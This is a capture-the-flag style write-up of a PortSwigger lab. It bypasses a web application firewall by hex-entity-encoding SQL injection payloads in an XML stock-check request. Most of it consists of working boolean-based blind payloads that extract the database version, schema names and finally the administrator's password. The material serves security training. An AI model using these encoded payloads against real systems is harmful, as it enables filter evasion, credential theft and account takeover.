
# SQL injection with filter bypass via XML encoding

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

Hint: A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection

- https://portswigger.net/web-security/sql-injection/cheat-sheet



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/1.png)

---------------------------------------------


The following payload allows to execute (SELECT 1), which returns the same as sending productId 1 and storeId 1:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		(&#x53;ELECT 1)
	</productId>
	<storeId>
		(&#x53;ELECT 1)
	</storeId>
</stockCheck>
```





![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/2.png)
![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/3.png)

We can encode it to HTML with Burp to avoid detection. The whole query “(SELECT 1)” HTML-encoded is:

```
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x31;)
```


Next we see this query works:

```
SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END
```

```
<productId>
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x31;&#x3d;&#x31;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;&#x0a;)
</productId>
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/4.png)

Next I will retrieve the version:

```
SELECT CASE WHEN (substring((SELECT version()),1,1)='a') THEN 1 ELSE 2 END
```

I sent it to Intruder and added delay between requests:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/5.png)

The version starts with "P":



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/6.png)

Then “o”:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/7.png)

It start with "PostgreSQL":

```
SELECT CASE WHEN (substring((SELECT version()),1,10)='PostgreSQL') THEN 1 ELSE 2 END
```

```
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x28;&#x29;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x30;&#x29;&#x3d;&#x27;&#x50;&#x6f;&#x73;&#x74;&#x67;&#x72;&#x65;&#x53;&#x51;&#x4c;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/8.png)

```
SELECT CASE WHEN (substring((SELECT table_name FROM information_schema.tables limit 1),1,5)='users') THEN 1 ELSE 2 END
```

```
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x73;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x35;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)
```

It returns the same as sending the value 1 (the lab restarted so it is now 370, not 356) so the table "users" exists:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/9.png)

Then we will try to find the fits column name from “users” table with:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,1)='a') THEN 1 ELSE 2 END
```

```
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;AAAAAAAA&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)
```

We get the same response as sending 1 with the character “u”, so it starts with u and it probably starts with "user":



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/10.png)

It seems it starts with "user":

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,4)='user') THEN 1 ELSE 2 END
```

```
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x34;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/11.png)

We send this to repeater and find the next letter is “n”, so it may be “username”:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,5)='userZ') THEN 1 ELSE 2 END
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/12.png)

Then check the first column name starts with “username”:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,8)='username') THEN 1 ELSE 2 END
```

```
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x38;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/13.png)

Then we send to Intruder:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,9)='usernameZ') THEN 1 ELSE 2 END
```

But it seems there are not more characters in this column name, it is “username”.



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/14.png)

Next we will find if the second column starts with password:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' and column_name!='username' limit 1),1,8)='password') THEN 1 ELSE 2 END
```

```
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x21;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x38;&#x29;&#x3d;&#x27;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```

It seems to be correct:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/15.png)

We will try to get the first character of the password with:

```
SELECT CASE WHEN (substring((SELECT password FROM users where username = 'administrator'),1,1)='a') THEN 1 ELSE 2 END
```


```
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;ZZZZZZZZZZ&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```

It starts with “h”:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/16.png)

Finally I got the administrator's password:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/17.png)